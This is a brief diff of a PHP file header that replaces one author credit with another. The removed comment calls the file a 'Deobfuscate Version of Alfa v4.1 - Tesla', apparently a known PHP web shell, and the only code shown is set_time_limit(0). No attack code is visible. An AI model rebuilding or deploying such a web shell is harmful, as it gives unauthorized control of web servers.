@@ -1,9 +1,7 @@
 <?php
 
 /*
- * @Avanter
- * Deobfuscate  Version of Alfa v4.1 - Tesla
- * blackwolf@post.com
+@MONSTER_hp
  */
 
 set_time_limit(0);
